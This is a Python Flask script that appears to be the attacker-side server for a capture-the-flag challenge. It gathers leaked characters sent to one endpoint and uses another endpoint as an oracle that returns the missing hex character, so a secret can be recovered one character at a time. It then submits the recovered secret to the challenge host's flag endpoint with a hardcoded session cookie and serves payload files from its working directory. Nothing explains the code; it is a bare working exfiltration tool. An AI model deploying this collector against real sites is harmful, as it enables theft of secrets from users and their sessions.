import os
from flask import Flask, request, send_from_directory
import requests

app = Flask(__name__)

leak = ""
charset = "abcdef0123456789"

@app.get("/tracotanza")
def sbrugna():
    global leak
    leak += request.args.get("c", "")
    print("I HAVE NOTIGG", leak)
    return "defend the fentanyl train"

@app.post("/sbrugo")
def goaso():
    final = request.args.get("data", "")
    if len(final) == 6:
        r = requests.get(f"https://09e79ecfa54a-thoughts.challs.m0lecon.it/flag?secret={final}", cookies={
            "session": "4db39b79284a42cc49afaeac8f9e69d61c89b7a5cc98eb35d5341456a040cf19"
        })

        print(r.text)
    return "Ok"

@app.get("/fent")
def asdasda():
    global leak
    cs = leak
    leak = ""
    for char in charset:
        if char not in cs:
            return char
    return ""

@app.route('/<path:filename>')
def serve_files(filename):
    return send_from_directory(os.getcwd(), filename)

if __name__ == "__main__":
    app.run("0.0.0.0")